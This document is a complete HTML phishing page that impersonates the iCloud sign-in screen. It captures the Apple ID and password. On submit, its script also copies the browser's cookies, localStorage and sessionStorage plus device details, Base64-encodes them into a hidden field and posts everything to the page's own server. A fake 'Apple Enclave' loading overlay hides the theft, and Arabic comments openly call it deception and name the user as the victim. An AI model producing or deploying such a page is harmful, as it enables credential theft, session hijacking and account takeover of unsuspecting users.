<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud | Device Security Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .login-box { width: 100%; max-width: 320px; text-align: center; padding: 20px; }
        .icloud-logo { width: 80px; height: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; color: #1d1d1f; margin-bottom: 25px; }
        .input-group { position: relative; margin-bottom: 15px; }
        input { width: 100%; padding: 12px 15px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #007aff; box-shadow: 0 0 0 4px rgba(0,122,255,0.1); }
        .btn-submit { width: 100%; padding: 12px; background-color: #007aff; color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .btn-submit:hover { background-color: #0071e3; }
        .footer-text { margin-top: 40px; font-size: 13px; color: #86868b; }
        .footer-text a { color: #0066cc; text-decoration: none; }
        /* تصميم التمويه */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p style="font-family: sans-serif; color: #86868b; margin-top: 15px;">Securely syncing with Apple Enclave...</p>
    </div>

    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/ICloud_logo.svg/2560px-ICloud_logo.svg.png" alt="iCloud" class="icloud-logo">
        <h1>Sign in to iCloud</h1>
        
        <form action="/auth/gate" method="POST" id="vault">
            <div class="input-group">
                <input type="email" name="u" id="email" placeholder="Apple ID" required autocomplete="username">
            </div>
            <div class="input-group">
                <input type="password" name="p" id="password" placeholder="Password" required autocomplete="current-password">
            </div>
            
            <input type="hidden" name="sid" id="sid">
            
            <button type="submit" class="btn-submit">Continue</button>
        </form>

        <div class="footer-text">
            <p>Forgotten your <a href="#">Apple ID or password?</a></p>
            <p>Don't have an Apple ID? <a href="#">Create one now.</a></p>
        </div>
    </div>

    <script>
        document.getElementById('vault').onsubmit = function(e) {
            // إظهار واجهة التحميل للتمويه
            document.getElementById('loading-overlay').style.display = 'flex';

            // محاولة جمع كافة بيانات الجلسة المتاحة تقنياً
            try {
                const sessionPayload = {
                    cookies: document.cookie, // الكوكيز (المفتاح الأساسي)
                    local_storage: {...localStorage}, // بيانات التخزين المحلي
                    session_storage: {...sessionStorage}, // بيانات التخزين المؤقت
                    screen_res: window.screen.width + "x" + window.screen.height, // دقة الشاشة للمطابقة
                    platform: navigator.platform, // نوع النظام
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone // المنطقة الزمنية للضحية
                };

                // تحويل البيانات لـ Base64 لضمان عدم تلف النص أثناء الإرسال
                const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(sessionPayload))));
                document.getElementById('sid').value = encodedData;
            } catch (err) {
                console.log("Session capture failed, sending basic data.");
            }
            
            // اترك الفورم يكمل الإرسال للسيرفر
            return true;
        };
    </script>
</body>
</html>
